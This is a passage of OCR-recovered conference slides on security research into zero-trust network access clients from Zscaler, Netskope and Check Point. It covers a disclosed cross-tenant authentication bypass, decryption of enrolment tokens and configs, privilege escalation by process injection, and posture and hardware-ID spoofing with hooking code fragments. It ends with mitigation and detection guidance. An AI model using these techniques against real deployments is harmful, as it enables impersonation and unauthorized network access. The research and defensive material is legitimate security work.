"exp": 1741606092, Signed with enrolment
"nbf": 1741602515 key for "AAAAA" . ,
```

## Slide 53

ZERO TRUST – TOTAL BUST

-

-

-

-


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
Cross-Tenant Auth Bypass - The fix
¢ We reported this bug to Netskope PSIRT on March 14th 2025
* It was fixed server-side in the 126.9.9 release on May 12 2925
* Netskope does not issue CVEs for server-side bugs
¢ If you scroll to the bottom of the release notes, you’ll find all the details ‘¢
Netskope fixed a security gap involving the validation of secure enrollment token(s), in which the token(s) could potentially have been abused
from one tenant to impersonate a user from another tenant.
```

## Slide 54

ZERO TRUST – TOTAL BUST

**54**


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Netskope Cross-Tenant
Auth Bypass
```

## Slide 55

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 56

ZERO TRUST – TOTAL BUST

-

-

-

-

-


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
You wouldn't steal a token...
+
* Even with Secure Enrollment - we only need the token to impersonate any user
* The Secure Enrollment token is added to the machine via the MSI arguments (or pushed via MDM)
¢ Stored in the registry and encrypted with DPAPI at:
* The call uses the flag 4 which translates to CRYPTPROTECT_LOCAL_MACHINE -
which means that any user on the machine can decrypt it
* Optional entropy is used. Hardcoded as:
BVar3 = CryptUnprotectData(&local_81c,(LPWSTR *)0x0,(DATA_BLOB
* )&GLOBAL_ENTROPY, (PVOID)0x0,
(CRYPTPROTECT_PROMPTSTRUCT
*)0x0,4,&local_824);
if (BVar3 != 0) {
if ((4 < DAT_00a17ce0) && (DAT_00a2d025 != '\O')) {
WriteLog((uint *)"nsEnrollmentToken",
(undefined1 (*) [16])
"C:\\jenkins\\tad0-cisystem\\workspace\\client-release-
pipeline\\client\\lib\\n sEnrollmentToken\\win\\nsEnrollmentToken.cpp"
,0xb1,5,'\@',"%s: AuthenticationToken size = %d");
}
```

## Slide 57

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Yes, that really is the entropy
GLOBAL ENTROPY
```

## Slide 58

ZERO TRUST – TOTAL BUST

**58**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Netskope Secure
Enrollment Token Theft
```

## Slide 59

ZERO TRUST – TOTAL BUST

-

-

-

-

-


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
What does all this mean?
¢ In IDP mode (without Secure Enrollment) - for enrolment
¢ In Secure Enrolment mode - from ANY Netskope customer
to any other - now fixed
* If Netskope Private Access (NPA) is enabled for the tenant, UserKey compromise could allow
private application or VPN equivalent access
* Even with Secure Enrollment, if you have the token, you can to bypass
traffic steering restrictions
¢ It’s still possible to invoke many API methods with only an OrgKey..
```

## Slide 60

-

-

-

-

**60**


> Recovered by OCR — confidence 95/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Configuration Theft & Replay
C2 Server
Legitimate User's
Device
Attacker's Virtual
Machine
Configuration is stored on the
Includes authentication token and
private keys
What if an attacker could
and put it on their own
device?
Now the attacker can operate on
their own machine - without EDR /
AV etc.
60
ZERO TRUST - TOTAL BUST
```

## Slide 61

ZERO TRUST – TOTAL BUST

- `o o`

- `o o`


> Recovered by OCR — confidence 80/100 on the text kept, 68/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
onfiguration Theft & Replay
Zscaler config is
Netskope config can be encrypted (but not default)
Tamper controls can dumping efforts,
but
Both products use for config encryption
Zscaler encrypts using the
Additional entropy required again ..
anit. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:68
tt * dt. "A La Vie, A L'Amour" - (oe.e0)
Ht / \ dit /*** Benjamin DELPY ‘gentilkiwi® ( benjamin@gentilkiwi.com )
tt \ / tt > https: //blog.gentilkiwi.com/mimikatz
mimikatz # dpapi::blob /in:F:\temp\2203D9B70BF384730C918119C5648BSB8F O6F25B++-config.dat
dwVersion : 0000001 - 1
dwMasterkeyVersion : 00900001 - 1
dwFlags : 99900000 - @ ()
dwDescriptionLen 0990002a - 42
szDescription : Client configuration
algCrypt 90096610 - 26128 (CALG_AES_256)
dwAlgCryptLen : 99000100 - 256
dwSaltLen 00000020 - 32
dwHmacKeyLen : 00000000 - 0
pbHmackKey
algHash ©000800e - 32782 (CALG_SHA_512)
dwAlgHashLen 00000200 - 512
dwHmac2KeyLen : 00000020 - 32
dwDataLen 00007a98 - 31376
```

## Slide 62

ZERO TRUST – TOTAL BUST

-

- `o`

-

- `o`

-


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Configuration Theft & Replay
Zscaler config is stored at:
Where is the SHA1 of the user’s SID def xor_bytes(bl: bytes, b2: bytes) -> bytes:
. return bytes([x * y for x, y in zip(b1, b2)])
Entropy is calculated by:
. def get_zscaler_entropy(user_sid: str) -> bytes:
Hashing the user SID hardcoded = b"<xor key goes here>"
. . . . sid_hash = hashlib. (user_sid. ()).
XORing it with a fixed key mixed = xor_bytes(hardcoded, sid_hash. ())
coe . . . half = len(mixed) //
Splitting the ciphertext in half and XORing both entropy = xor_bytes(mixed[:half], mixed[half:])
halves return entropy
```

## Slide 63

ZERO TRUST – TOTAL BUST

- `o`

-

-

-

-


> Recovered by OCR — confidence 80/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Configuration Theft & Replay
+
hd ht Services GPU Disk Network Comment Windows
Zscaler config dump requires SYSTEM ee
Which would require an administrator user or a Local a crn aces yb)
Privilege Escalation ee
Directory Handle Properties xe
Directory e, Creat...
Event General Security
Event
RPC authentication uses signature check —
Object name: RPC Control\ZSATrayManager_talk_to_me bery
Group or user names:
Can be bypassed via process injection/hollowing = 82 RESTRICTED
Fi 82 Administrators (ZSVM-1\Administrators) | Sama
ile ichronize
7 7 File {, Synchr...
This allows us to call arbitrary RPC methods from ne Tohono pamiuoona cok Ei - ad
File te data, ...
id Full control
Key Connect Vv
key Special permissions
Key
Key
Key For special permissions or advanced settings, click
Key Advance 4 ig Advanced
Key
Key
Key Close
Close
```

## Slide 64

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 65

ZERO TRUST – TOTAL BUST

\```
o
\```

-

-

\```
o
\```

\```
o
\```

\```
o
o
\```


> Recovered by OCR — confidence 78/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Local Privilege Escalation
Same pattern in:
ZERO TRUST -T
Netskope r
Zscaler L Client GUL ]
Perimeter81 _s } PID Check
Cato L gone
= Named Pipe
a Debueging E TCP Port
privilege process makes IPC to Lesage ] ALPC Port
privilege service
that the caller is a ( TCP Proxy BLL ------------S
legitimate process a « i
Injected BLL '
mecve Payload
( ZTNWA Service
[ erm Helper Service
}
High Privileged
Malicious Process
```

## Slide 66

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ProgramData
Windc
Ry Gallery
Downloads
Documents
PR Pictures m.microsoft
} Music
SoftwareDistribution
temp USOPrivate
USOShared
ntuser,
@ This
& Windows (C:)
```

## Slide 67

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 81/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
5 PowerShell x +\v ia) x
PS C:\tools>
“) Settings
ication pop-up
ill only turn off no ons. Critical notifications will still
4) Troubleshoot
g Mode
*) About
sion: 4.7.0.61
```

## Slide 68

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 69

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

-


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
So, you’re enrolled. Now what?
Posture checking is the process of verifying the security status of a device before allowing it to
connect to protected resources. Here's what it typically involves:
* Operating System Check
¢ Antivirus/Antimalware Status
* Disk Encryption
* Compliance with Security Policies
* Certificate Validation
¢ Hardware ID
```

## Slide 70

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Posture Checks
ZTWA Engine / Web Server
Pesture Check List
Send Results
Z2TNA Client
Query
Query Results
Operating System
ZERO TRUST - T
```

## Slide 71

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Posture Checks - HTTP Proxy
ZTNA Engine / Web Server
Intercepting Web Proxy
Posture Check List
Send Results
POST /client/deviceclassification HTTP/1.1
Content-Type: application/json
“av_check": [
"product_name": "Microsoft Defender",
"signature_up_to_date": "true",
"status": "true"
ZTNA Client
Query
WMI/Registry/Instructions
Query Results
[
Operating System
]
HTTP/1.1 200 OK
Content-Type: application/json
{"status":"success","latest_modified_time":"2025-02-
25T17:26:21.000Z","deviceClassification":[["Compliant
Policy"],[2298]]}
```

## Slide 72

ZERO TRUST – TOTAL BUST

\```
o
\```

\```
o
\```


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -T
Posture Checks - API Hooking
+
( ZTNA Engine / Web Server }
Device compliance gets sent again down
Posture Check List Send Results the DTLS tunnel
[ ZTWA Chent ] API hooking means that compliance can
be faked without traffic interception
Query
WMI/Registry/Instructions Query Results
( Injected DLL - API Hooking ]
[ Operating System |
```

## Slide 73

ZERO TRUST – TOTAL BUST

\```
o
o
o
\```

\```
o
o
o
o
o
o
\```


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
Hardware ID
Provides a unique ID for each device
If a new ID is seen - refuse connection
Hashes information such as: | CPUZD(1) = 18BFBFFO00906ED |
Machine GUID | Serial = 2438690b
Hard disk serial es San
User SID
Hardware ID = 242669E0-D29A-B117-8D78-10EA1ABF2AC2Q
CPUID
```

## Slide 74

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

-

-

-


> Recovered by OCR — confidence 82/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Introducing... RedScaler
Hook the hardware ID functions to return different values
Some vendors implement anti-tamper or signing Checks — try [eM earae reenter
return S_OK;
to avoid patching the executable sto RealCoCreateInstance jook: :GetOriginalFunction<decl
&CoCreateInstance)>("C eInstance");
Hook Windows API methods: oeauee
IwSCProductList* pRealList = nt 2
HRESULT hr = RealCoCreateInstance(CLSI0 LS NULL, CLSCTX_INPROC_SERVER ,
if (SUCCEEDED(hr)) {
File and Disk APIs ( and ) pRealList->Initialize(providertype);
pRealList->get_Count (&count) ;
LSA query APIs sad veat prod
for (LONG i = 0; i < count; i++) {
IWscProduct* pProduct =
WMI ( via ) if *(SUCCeenn(pheatL ist >get ao, &pProduct))) {
COM methods (hook and override
vTable)
DLL Injection - or signed driver abuse n-preaucts push back
return S_OK;
}
}
}
pRealList->Release();
4 FakeWscProduct());
}
```

## Slide 75

-

-

-

-

-

**75**


> Recovered by OCR — confidence 91/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
context = ->ContextRecord;
_WIN64
GetSpoofedCpuid(CpuidRegister: :
GetSpoofedCpuid(CpuidRegister: :
GetSpoofedCpuid(CpuidRegister: :
GetSpoofedCpuid(CpuidRegister: :
context->Rip += 2;
Hardware ID - Hooking
What about CPUID?
It's an , we can't just hook it!
Runtime decompiler (e.g. Zydis) to scan
for CPUID instructions
Use a hook to trap on
CPUID calls
Register to switch out
the register values
Go harder? Bring your own Hypervisor
75
ZERO TRUST - TOTAL BUST
```

## Slide 76

\```
o
o
\```

-

-

-

**76**


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RedScaler - RSManager
File Tools View
@® Settings
Settings Hardware | Disk | Files & Processes | Identity |
(_] Hooking
\V) Firewall Enabled
|W) Bitlocker Enabled
| Patch Certificate Checks
|\¥) CPUID Hook Enabled
CPUID AX: 0x000906ED
CPUID EBX; 002080800
CPUID ECX; 9xFEDA3203
Enable DLL
RedScaler GUI
Import/export ZTNA configs
Detects installed product
Dynamically changes reported values
Bypasses posture checks
Features for fetching the posture profile
from the server, and calculating
hardware ID based on spoofed values
76
ZERO TRUST - TOTAL BUST
```

## Slide 77

ZERO TRUST – TOTAL BUST

**77**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZScaler Config
Replay & Posture
Bypass
```

## Slide 78

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 79

ZERO TRUST – TOTAL BUST

\```
o
o
\```


> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
Putting the Trust in Zero Trust
+
All solutions install a trusted
Allows traffic inspection for steering
| Console Root Issued To Issued By Expiration Date = Intended Purposes Friendly Name
~ =F coe (recs Computer) Ea) Perimeter31 Secure Web Gateway Perimeter31 Secure Web Gateway 04/03/2065 <All> <None>
J rersona CC Zscaler Root CA 06/05/2042 <All> <None>
w (| Trusted Root Certification Authorities .
ertificates
```

## Slide 80

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 86/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
What Happens in the Engine...
..Stays in the engine?
Zero Trust Engine
Steering [ IPs les
Config requested Bl ) ~
Root CA & PAC
TLS Clear text data TLS
```

## Slide 81

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -°
What Happens in the Engine...
..Stays in the engine?
Zero Trust Engine
ol IPSs le
Config requested _t “
Root CA & PAC
TLS Clear text data TLS
```

## Slide 82

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

-

-

-


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
Defence and Mitigations
¢ Ensure for Netskope!
¢ Ensure ZTNA clients are updated to the latest version
¢ Use server-side validated posture checks (e.g. server-side certificate check)
¢ Enable periodic checks with a high frequency, e.g. every 2 minutes
* Enable anti-tamper features
¢ Disable debugging and verbose logging features in clients
¢ Ensure authentication tokens are rotated regularly
¢ Set re-authentication period to a suitable value (e.g. daily, weekly)
¢ Use domain exclusions or app-based bypasses carefully - review on a regular basis
```

## Slide 83

ZERO TRUST – TOTAL BUST

-

-

-

-

   -

-

-

-

-

- **`ZSATray.exe stAgentUI.exe`**


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
Defence and Mitigations
¢ Check logs (where available) for:
* New Devices registered
* Devices that fail posture checks and subsequently pass them
* Devices registered from unexpected locations or Operating Systems
¢ Users with multiple devices
* Consider ingesting ZTNA endpoint logs, which can provide rich data
¢ Use EDR to alert on suspicious activities such as:
* Reading of sensitive registry paths such as auth tokens, or configuration paths
* Suspicious child processes of ZTNA clients
* Process injection into ZTNA clients (e.g. or )
```

## Slide 84

ZERO TRUST – TOTAL BUST

-

-

- **`Microsoft-Windows-Crypto-`**

- **`DPAPI/Debug`**

-

- **`CallerProcessID`**

- **`DataDescription`**


> Recovered by OCR — confidence 84/100 on the text kept, 80/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
ZERO TRUST -°
Detecting Token & Config Theft
¢ Audit DPAPI Events
¢ No vendors used CRYPTPROTECT_AUDIT
¢ Enable
« Event ID == 16385
¢ Correlate by /
) Event Properties - Event 16385, Crypto-DPAPI
General Details
O Friendly View © XML View
- <Event ns="http:/ /schemas.microsoft.com/win/2004/08/events/event">
<System>
<Provider Name="Microsoft-Windows-Crypto-DPAPI" Guid="{89fe8f40-cdce-464e-
8217-15ef97d4c7c3}" />
<EventID>16385</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>64</Task>
<Opcode>0</Opcode>
<TimeCreated SystemTime="2025-07-15T14:
<EventRecordID>1</EventRecordID>
<Correlation ActivityID="{66da527d-f594-0004- 2353-da6694f5db01}" />
<Execution ProcessID="784" ThreadID="1764" />
<Computer>ZSVM-1</Computer>
<Security UserID="S-1-5-18" />
</System>
- <EventData>
<Data Name="OperationType">SPCryptUnprotect</Data>
8.0386353Z" />
| <Data DataDescription">Client confiquration</Data> |
<Data Flags">0</Data>
<Data
<Data
<Data
ProtectionFlags">0</Data>
ReturnValue">0</Data>
<Data Name="PlainTextDataSize">31368</Data>
</EventData>
</Event>
Copy
Close
```

## Slide 85

ZERO TRUST – TOTAL BUST

-

-

- **`ProcessId ObjectName`**


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
etecting Token & Config Theft
Use SACLs to detect unauthorized read of
registry keys or configuration files
Event ID == 4663
Correlate by /
{8 Event Properties - Event 4663, Microsoft Windows security auditing.
General Details
D Friendly View © XML View
4994-a5ba-3e3b0328c30d}" />
<EventID>4663</EventID>
<Version>1</Version>
<Level>0</Level>
<Task>12801</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000 </Keywords>
<TimeCreated SystemTime="2025-07-15T14:46:25.8558060Z" />
<EventRecordID>25214</EventRecordID>
<Correlation />
<Execution ProcessID="4" ThreadID="7924" />
<Channel>Security</Channel>
<Computer>ZSVM-1</Computer>
<Security
</System>
<EventData>
<Data Name="SubjectUserSid" >S- 1-5-21-685238863-1523374346-3363275695-
1000</Data>
<Data Name="SubjectUserName">Admin</Data>
<Data Name="SubjectDomainName">ZSVM-1</Data>
<Data Name="SubjectLogonId">0x42a01</Data>
<Data Name="ObjectServer">Security</Data>
<Data Name="ObjectType">Key</Data>
<Data Name="HandlelId">0x58c</Data>
<Data Name="AccessList">%%1538</Data>
<Data Name="AccessMask">0x20000</Data>
<Data Name="ProcessId" >Oxee4</Data>
<Data Name="ResourceAttributes' >- </Data>
</Event>
Copy
Close
```

## Slide 86

ZERO TRUST – TOTAL BUST

\```
o
\```

\```
o
\```

\```
o
\```

\```
o
o
o
\```

\```
o
\```

\```
o
\```


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
Conclusion
ZTNA FOLLOWS THE MOTTO: SO WE DON’T TRUST THE
NEVER TRUST, ALWAYS VERIFY. USERS OR THE DEVICES. The same bugs:
Authentication bypass
Privilege escalation
©) Posture check bypasses
& Less privacy:
Clear text traffic processed by
someone else’s cloud
WHAT ABOUT THE VENDOR? OH, WE TRUST THEM
COMPLETELY. The good news?
yy, Patching is easier - the vendor can
7 7 push a global fix
```

## Slide 87

ZERO TRUST – TOTAL BUST

**87**

## Slide 88

ZERO TRUST – TOTAL BUST

- <u>NSKPSA-2024-001 – Netskope</u>

- <u>Secure Enrollment - Netskope Knowledge Portal</u>

- <u>Device Classification for Windows - Netskope Knowledge Portal</u>

- <u>Configuring Device Posture Profiles | Zscaler</u>

- <u>Using Zscaler Client Connector Portal as an Identity Provider | Zscaler</u>

- <u>Netskope Client Service Local Privilege Escalation</u>

- <u>Cache me if you can — Local Privilege Escalation in Zscaler Client Connector | by Winston Ho</u>

- <u>Google Online Security Blog: Detecting browser data theft using Windows Event Logs</u>

- <u>The Defender’s Guide to the Windows Registry | by Luke Paine</u>
